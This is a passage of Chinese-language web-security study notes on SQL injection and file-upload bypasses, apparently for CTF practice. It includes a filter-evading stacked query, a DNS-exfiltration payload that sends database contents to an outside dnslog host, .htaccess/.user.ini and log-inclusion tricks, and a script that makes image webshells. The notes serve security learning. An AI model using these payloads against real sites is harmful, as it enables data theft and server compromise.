(cnblogs.com)</a></p><ul><li><p>原语句:</p><div class="language-sql"><button title="Copy code" class="copy"></button><span class="lang">sql</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #F78C6C">1</span><span style="color: #89DDFF">&#39;</span><span style="color: #C3E88D">;select flag from `1919810931114514`;</span></span></code></pre></div></li><li><p>由于<code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code>select被过滤</p></li><li><p>改为:</p><div class="language-sql"><button title="Copy code" class="copy"></button><span class="lang">sql</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #F78C6C">1</span><span style="color: #89DDFF">&#39;</span><span style="color: #C3E88D">;set @sql = CONCAT(</span><span style="color: #89DDFF">&#39;</span><span style="color: #BABED8">se</span><span style="color: #89DDFF">&#39;</span><span style="color: #C3E88D">,</span><span style="color: #89DDFF">&#39;</span><span style="color: #BABED8">lect </span><span style="color: #89DDFF">*</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">from</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">`</span><span style="color: #C3E88D">1919810931114514</span><span style="color: #89DDFF">`</span><span style="color: #BABED8">;</span><span style="color: #89DDFF">&#39;</span><span style="color: #C3E88D">);prepare stmt from @sql;EXECUTE stmt;</span></span></code></pre></div></li><li><p>解析:</p><ul><li><div class="language-sql"><button title="Copy code" class="copy"></button><span class="lang">sql</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #F78C6C">sEt</span><span style="color: #BABED8"> @sql </span><span style="color: #89DDFF">=</span><span style="color: #BABED8"> </span><span style="color: #82AAFF">CONCAT</span><span style="color: #BABED8">(</span><span style="color: #89DDFF">&#39;</span><span style="color: #C3E88D">se</span><span style="color: #89DDFF">&#39;</span><span style="color: #BABED8">,</span><span style="color: #89DDFF">&#39;</span><span style="color: #C3E88D">lect * from `1919810931114514`;</span><span style="color: #89DDFF">&#39;</span><span style="color: #BABED8">);</span></span></code></pre></div><ul><li><code>set</code>用于设置变量名和值</li><li><code>CONCAT</code><strong>拼接语句, 绕过过滤</strong></li></ul></li><li><div class="language-sql"><button title="Copy code" class="copy"></button><span class="lang">sql</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #BABED8">prepare stmt </span><span style="color: #F78C6C">from</span><span style="color: #BABED8"> @sql;</span></span></code></pre></div><p><code>prepare</code>用于预备一个语句，并赋予名称，以后可以引用该语句</p></li><li><div class="language-sql"><button title="Copy code" class="copy"></button><span class="lang">sql</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"></span></code></pre></div></li></ul><p>  EXECUTE stmt;</p><div class="language-txt"><button title="Copy code" class="copy"></button><span class="lang">txt</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #babed8"></span></span><span class="line"><span style="color: #babed8">`execute`执行语句</span></span></code></pre></div></li></ul><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><ul><li>普通注入: 数据直接进入到 SQL 查询中</li><li>二次注入: 输入数据经处理后<strong>存储</strong>, 取出后, <strong>再次</strong>进入到 SQL 查询</li></ul><h5 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h5><ul><li>插入<code>1‘#</code></li><li>被转义成<code>1\’#</code></li><li>不能注入，但是<strong>保存在数据库</strong>时变成了原来的<code>1’#</code></li><li>利用<code>1’#</code>进行注入,这里利用时要求取出数据时不转义</li></ul><h5 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h5><p><a href="https://buuoj.cn/challenges#[%E7%BD%91%E9%BC%8E%E6%9D%AF2018]Unfinish">网鼎杯2018-Unfinish</a></p><ul><li>注册时在<code>username</code>注入sql语句</li><li>此时数据被转义, <strong>无法注入</strong></li><li>利用邮箱登录后重新加载<code>username</code>, 此时没有转义, 注入语句成功执行</li></ul><h3 id="DNS注入"><a href="#DNS注入" class="headerlink" title="DNS注入"></a>DNS注入</h3><ul><li>DNS协议：将域名转化为IP 日志 &#x3D;&gt; 记录了域名转化IP请求</li></ul><p><em><strong>DNS注入的核心，将盲注转化为显错注入</strong></em></p><ul><li>payload例子:</li></ul><div class="language-sql"><button title="Copy code" class="copy"></button><span class="lang">sql</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #F78C6C">select</span><span style="color: #BABED8"> load_file(</span><span style="color: #82AAFF">concat</span><span style="color: #BABED8">(</span><span style="color: #89DDFF">&#39;</span><span style="color: #C3E88D">//</span><span style="color: #89DDFF">&#39;</span><span style="color: #BABED8">,(</span><span style="color: #F78C6C">select</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">database</span><span style="color: #89DDFF">()</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">limit</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0</span><span style="color: #BABED8">,</span><span style="color: #F78C6C">1</span><span style="color: #BABED8">),</span><span style="color: #89DDFF">&#39;</span><span style="color: #C3E88D">.81k8pu.dnslog.cn/abc</span><span style="color: #89DDFF">&#39;</span><span style="color: #BABED8">));</span></span></code></pre></div><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>靶场: <a href="https://github.com/c0ny1/upload-labs">c0ny1&#x2F;upload-labs: 一个想帮你总结所有类型的上传漏洞的靶场 (github.com)</a></p><p>推荐文章: <a href="https://zhuanlan.zhihu.com/p/631648316">一文爽 文件上传漏洞原理、方法和类型详细解析 - 知乎 (zhihu.com)</a></p><h3 id="黑白盒测试"><a href="#黑白盒测试" class="headerlink" title="黑白盒测试"></a>黑白盒测试</h3><h4 id="黑盒"><a href="#黑盒" class="headerlink" title="黑盒"></a>黑盒</h4><p><strong>寻找一切存在文件上传的功能应用</strong></p><ol><li>个人用户中心是否存在文件上传功能</li><li>后台管理系统是否存在文件上传功能</li><li>字典目录扫描探针文件上传构造地址</li><li>字典目录扫描探针编辑器目录构造地址</li></ol><h4 id="白盒"><a href="#白盒" class="headerlink" title="白盒"></a>白盒</h4><p><strong>看三点，中间件，编辑器，功能代码</strong></p><ol><li>中间件直接看语言环境常见搭配</li><li>编辑器直接看目录机构或搜索关键字</li><li>功能代码直接看源码应用或搜索关键字</li></ol><h3 id="解析执行"><a href="#解析执行" class="headerlink" title="解析执行"></a>解析执行</h3><h4 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h4><ul><li>可以上传一个.user,ini文件, 自定义以php解析特定文件, 例如<div class="language-txt"><button title="Copy code" class="copy"></button><span class="lang">txt</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #babed8">auto_prepend_file=test.txt</span></span><span class="line"><span style="color: #babed8">//或者</span></span><span class="line"><span style="color: #babed8">auto_append_file=test.txt</span></span></code></pre></div></li></ul><h4 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h4><h5 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h5><ul><li>.htaccess文件是Apache服务器中的一个配置文件</li><li>.apache配置文件为AllowOverride All(默认为None)</li></ul><h5 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h5><ul><li>Apache开启rewrite模块</li></ul><h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><div class="language-txt"><button title="Copy code" class="copy"></button><span class="lang">txt</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #babed8">&lt;FilesMatch&quot;x.png&quot;&gt;</span></span><span class="line"><span style="color: #babed8">SetHandlerapplication/x-httpd-php</span></span><span class="line"><span style="color: #babed8">&lt;/FilesMatch&gt;</span></span></code></pre></div><ul><li>x.png是代码将该目录下文件叫x.png的文件以php进行执行</li><li>上传.htaccess，上传一张名叫x.png的文件，即可执行</li></ul><h3 id="过滤绕过"><a href="#过滤绕过" class="headerlink" title="过滤绕过"></a>过滤绕过</h3><h4 id="绕过过滤"><a href="#绕过过滤" class="headerlink" title="绕过&lt;?php?&gt;过滤"></a>绕过&lt;?php?&gt;过滤</h4><ul><li><code>&lt;?   ?&gt;</code>需要开启短标签开关，short_open_tag</li><li><code>&lt;?= ?&gt;</code>PHP版本&gt;PHP 5.4.0</li><li><code>&lt;% %&gt;</code>asp_tags设成On</li><li><code>&lt;script language=&quot;php&quot;&gt;&lt;/script&gt;</code>php7之后就不能用了</li></ul><h4 id="利用反引号-绕过"><a href="#利用反引号-绕过" class="headerlink" title="利用反引号&#96;&#96;绕过"></a>利用反引号&#96;&#96;绕过</h4><ul><li>反引号运算符”&#96;”相当于 “shell_exec() “函数, 将里面的内容作为shell命令来执行</li></ul><h4 id="包含日志"><a href="#包含日志" class="headerlink" title="包含日志"></a>包含日志</h4><ul><li><p>将后门代码写入UA头中</p></li><li><p>写入.user.ini配置文件，将日志文件内容通过文件包含访问</p></li><li><p>例如:</p><p><code>user.ini:auto_prepend_file-test.png</code><br><code>test.png:&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</code></p></li></ul><h4 id="短网址绕过”-”"><a href="#短网址绕过”-”" class="headerlink" title="短网址绕过”.”"></a>短网址绕过”.”</h4><ul><li>在需要远程文件包含, 但过滤了点号<code>.</code>时, 可以使用短链接</li><li>比如<code>http://47.94.236.117/</code>转换为<code>http://794750069/</code>就可以绕过过滤</li></ul><h3 id="文件头检测"><a href="#文件头检测" class="headerlink" title="文件头检测"></a>文件头检测</h3><ul><li><p>文件头部检测是否为图片格式文件, 如图像会检测头部是否为<code>GIF89a</code></p></li><li><h2 id="可在文件头部添加该特征绕过检测-例如-user-ini-GIF89Aauto-prepend-file-test-png"><a href="#可在文件头部添加该特征绕过检测-例如-user-ini-GIF89Aauto-prepend-file-test-png" class="headerlink" title="可在文件头部添加该特征绕过检测, 例如&#96;&#96;&#96;user ini:GIF89Aauto_prepend_file&#x3D;test.png"></a>可在文件头部添加该特征绕过检测, 例如<br>&#96;&#96;&#96;<br>user ini:<br>GIF89A<br>auto_prepend_file&#x3D;test.png</h2><p>test.png:<br>GIF89A</p><?=include"/var/lo"."g/nginx/access.lo"."g"?></li><li><p><a href="https://www.cnblogs.com/WangAoBo/p/6366211.html">常见文件的文件头标志 - M4x - 博客园 (cnblogs.com)</a></p></li></ul><h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><p><a href="https://blog.csdn.net/weixin_45588247/article/details/118796606?spm=1001.2014.3001.5501">【文件上传绕过】——条件竞争漏洞-CSDN博客</a></p><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>服务器端在处理不同用户的请求时是并发进行的，因此，如果<strong>并发处理不当</strong>或相关<strong>操作逻辑顺序</strong>设计的不合理时，将会导致此类问题的发生</p><p>例如:</p><ul><li>上传文件源代码里没有校验上传的文件</li><li>上传成功后才进行判断</li><li>如果文件格式符合要求，则重命名，如果文件格式不符合要求，将文件删除</li></ul></blockquote><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><ul><li>营造10000人同时上传文件1.php的情境, 另外有10000人在同时访问这个1.php</li><li>上传文件时，这个文件会有<strong>一段时间</strong>留存在服务器的上传目录下</li><li>而服务器脚本在进行判断文件是否合法而对文件进行删除时，会有<strong>一定的处理时间</strong></li><li>可能在某个时间里，<strong>服务器还未来得及删除文件</strong>,</li><li>此时利用1.php<strong>重新生成</strong>一个php文件</li></ul><h3 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h3><p><a href="https://blog.csdn.net/qq_40800734/article/details/105920149">文件上传之二次渲染绕过_二次渲染绕过怎么操作-CSDN博客</a></p><p><a href="https://blog.csdn.net/weixin_45588247/article/details/119177948">【文件上传绕过】——二次渲染漏洞_二次渲染绕过-CSDN博客</a></p><h4 id="二次渲染原理"><a href="#二次渲染原理" class="headerlink" title="二次渲染原理"></a>二次渲染原理</h4><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p> 在我们上传文件后，网站会对图片进行二次处理（格式、尺寸要求等），服务器会根据我们原有的图片<strong>生成</strong>一个<strong>新的图片</strong>并放到网站对应的标签进行显示。</p></blockquote><h4 id="识别"><a href="#识别" class="headerlink" title="识别"></a>识别</h4><ul><li>检查上传前后图片文件大小是否更改</li></ul><h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><ul><li>使用脚本生成图片马, 例如:<div class="language-php"><button title="Copy code" class="copy"></button><span class="lang">php</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #89DDFF">&lt;?</span><span style="color: #BABED8">php</span></span><span class="line"><span style="color: #89DDFF">$</span><span style="color: #BABED8">p </span><span style="color: #89DDFF">=</span><span style="color: #BABED8"> </span><span style="color: #82AAFF">array</span><span style="color: #89DDFF">(</span><span style="color: #F78C6C">0xa3</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0x9f</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0x67</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0xf7</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0x0e</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0x93</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0x1b</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0x23</span><span style="color: #89DDFF">,</span></span><span class="line"><span style="color: #BABED8">           </span><span style="color: #F78C6C">0xbe</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0x2c</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0x8a</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0xd0</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0x80</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0xf9</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0xe1</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0xae</span><span style="color: #89DDFF">,</span></span><span class="line"><span style="color: #BABED8">           </span><span style="color: #F78C6C">0x22</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0xf6</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0xd9</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0x43</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0x5d</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0xfb</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0xae</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0xcc</span><span style="color: #89DDFF">,</span></span><span class="line"><span style="color: #BABED8">           </span><span style="color: #F78C6C">0x5a</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0x01</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0xdc</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0x5a</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0x01</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0xdc</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0xa3</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0x9f</span><span style="color: #89DDFF">,</span></span><span class="line"><span style="color: #BABED8">           </span><span style="color: #F78C6C">0x67</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0xa5</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0xbe</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0x5f</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0x76</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0x74</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0x5a</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0x4c</span><span style="color: #89DDFF">,</span></span><span class="line"><span style="color: #BABED8">           </span><span style="color: #F78C6C">0xa1</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0x3f</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0x7a</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0xbf</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0x30</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0x6b</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0x88</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0x2d</span><span style="color: #89DDFF">,</span></span><span class="line"><span style="color: #BABED8">           </span><span style="color: #F78C6C">0x60</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0x65</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0x7d</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0x52</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0x9d</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0xad</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0x88</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0xa1</span><span style="color: #89DDFF">,</span></span><span class="line"><span style="color: #BABED8">           </span><span style="color: #F78C6C">0x66</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0x44</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0x50</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0x33</span><span style="color: #89DDFF">);</span></span><span class="line"><span style="color: #BABED8"> </span></span><span class="line"><span style="color: #BABED8"> </span></span><span class="line"><span style="color: #BABED8"> </span></span><span class="line"><span style="color: #89DDFF">$</span><span style="color: #BABED8">img </span><span style="color: #89DDFF">=</span><span style="color: #BABED8"> </span><span style="color: #82AAFF">imagecreatetruecolor</span><span style="color: #89DDFF">(</span><span style="color: #F78C6C">32</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">32</span><span style="color: #89DDFF">);</span></span><span class="line"><span style="color: #BABED8"> </span></span><span class="line"><span style="color: #89DDFF; font-style: italic">for</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">($</span><span style="color: #BABED8">y </span><span style="color: #89DDFF">=</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0</span><span style="color: #89DDFF">;</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">$</span><span style="color: #BABED8">y </span><span style="color: #89DDFF">&lt;</span><span style="color: #BABED8"> </span><span style="color: #82AAFF">sizeof</span><span style="color: #89DDFF">($</span><span style="color: #BABED8">p</span><span style="color: #89DDFF">);</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">$</span><span style="color: #BABED8">y </span><span style="color: #89DDFF">+=</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">3</span><span style="color: #89DDFF">)</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">&#123;</span></span><span class="line"><span style="color: #BABED8">   </span><span style="color: #89DDFF">$</span><span style="color: #BABED8">r </span><span style="color: #89DDFF">=</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">$</span><span style="color: #BABED8">p</span><span style="color: #89DDFF">[$</span><span style="color: #BABED8">y</span><span style="color: #89DDFF">];</span></span><span class="line"><span style="color: #BABED8">   </span><span style="color: #89DDFF">$</span><span style="color: #BABED8">g </span><span style="color: #89DDFF">=</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">$</span><span style="color: #BABED8">p</span><span style="color: #89DDFF">[$</span><span style="color: #BABED8">y</span><span style="color: #89DDFF">+</span><span style="color: #F78C6C">1</span><span style="color: #89DDFF">];</span></span><span class="line"><span style="color: #BABED8">   </span><span style="color: #89DDFF">$</span><span style="color: #BABED8">b </span><span style="color: #89DDFF">=</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">$</span><span style="color: #BABED8">p</span><span style="color: #89DDFF">[$</span><span style="color: #BABED8">y</span><span style="color: #89DDFF">+</span><span style="color: #F78C6C">2</span><span style="color: #89DDFF">];</span></span><span class="line"><span style="color: #BABED8">   </span><span style="color: #89DDFF">$</span><span style="color: #BABED8">color </span><span style="color: #89DDFF">=</span><span style="color: #BABED8"> </span><span style="color: #82AAFF">imagecolorallocate</span><span style="color: #89DDFF">($</span><span style="color: #BABED8">img</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">$</span><span style="color: #BABED8">r</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">$</span><span style="color: #BABED8">g</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">$</span><span style="color: #BABED8">b</span><span style="color: #89DDFF">);</span></span><span class="line"><span style="color: #BABED8">   </span><span style="color: #82AAFF">imagesetpixel</span><span style="color: #89DDFF">($</span><span style="color: #BABED8">img</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #82AAFF">round</span><span style="color: #89DDFF">($</span><span style="color: #BABED8">y </span><span style="color: #89DDFF">/</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">3</span><span style="color: #89DDFF">),</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">0</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">$</span><span style="color: #BABED8">color</span><span style="color: #89DDFF">);</span></span><span class="line"><span style="color: #89DDFF">&#125;</span></span><span class="line"><span style="color: #BABED8"> </span></span><span class="line"><span style="color: #82AAFF">imagepng</span><span style="color: #89DDFF">($</span><span style="color: #BABED8">img</span><span style="color: #89DDFF">,</span><span style="color: #89DDFF">&#39;</span><span style="color: #C3E88D">./1.png</span><span style="color: #89DDFF">&#39;</span><span style="color: #89DDFF">);</span></span><span class="line"><span style="color: #89DDFF">?&gt;</span></span></code></pre></div></li></ul><h3 id="中间件解析漏洞"><a href="#中间件解析漏洞" class="headerlink" title="中间件解析漏洞"></a>中间件解析漏洞</h3><p><a href="https://blog.csdn.net/m0_64378913/article/details/125067293">中间件文件解析漏洞概述及实例——Apache、IIS和Nginx_中间件解析漏洞-CSDN博客</a></p><h4 id="IIS-5-x-6-x"><a href="#IIS-5-x-6-x" class="headerlink" title="IIS 5.x-6.x"></a>IIS 5.x-6.x</h4><ul><li>文件解析: iis6.0下，<strong>分号后面的不被解析</strong>, <code>xx.asp;.jpg</code>被解析为asp</li><li>目录解析: 名字为<code>.asp</code>、<code>.asa</code>的<strong>文件夹</strong>, 其下任何扩展名的文件都被IIS当做<strong>asp文件</strong>来解析并执行</li></ul><h4 id="IIS7-5"><a href="#IIS7-5" class="headerlink" title="IIS7.5"></a>IIS7.5</h4><ul><li>与nginx的类似</li></ul><h4 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h4><h5 id="换行解析"><a href="#换行解析" class="headerlink" title="换行解析"></a>换行解析</h5><ul><li><p>利用前提: 黑名单验证(不能上传php jsp等) version: 2.4.0~2.4.29</p></li><li><p>在解析PHP时，<code>1.php%0A</code>将被按照PHP后缀进行解析(%0a为换行)</p></li></ul><h5 id="多后缀解析"><a href="#多后缀解析" class="headerlink" title="多后缀解析"></a>多后缀解析</h5><ul><li><p>Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令</p></li><li><p>如果添加了如下配置, <code>1.php.png</code>可以当成php解析</p><div class="language-txt"><button title="Copy code" class="copy"></button><span class="lang">txt</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #babed8">AddHandler application/x-httpd-php .php</span></span></code></pre></div></li></ul><h4 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h4><h5 id="文件名逻辑漏洞"><a href="#文件名逻辑漏洞" class="headerlink" title="文件名逻辑漏洞"></a>文件名逻辑漏洞</h5><ul><li><code>1.gif[0x20][0x00].php</code>Nginx却错误地认为请求的文件是<code>1.gif[0x20]</code></li></ul><h5 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h5><ul><li>用户配置不当造成漏洞</li><li><code>http://ip/1.png</code>访问图片, 